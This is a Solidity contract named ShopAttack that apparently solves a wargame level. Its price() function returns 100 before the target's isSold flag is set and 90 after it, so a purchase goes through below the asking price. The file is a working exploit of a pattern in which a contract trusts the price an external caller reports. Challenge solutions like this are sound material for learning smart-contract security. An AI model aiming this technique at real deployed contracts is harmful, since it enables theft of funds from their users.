// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./shop.sol";

contract ShopAttack {
    Shop public target;

    constructor(address targetAdr) public {
        target = Shop(targetAdr);
    }

    function attck() public {
        target.buy();
        require(target.price() == 90, "error");
    }

    function price() public view returns (uint) {
        if (target.isSold()) {
            return 90;
        }
        return 100;
    }
}
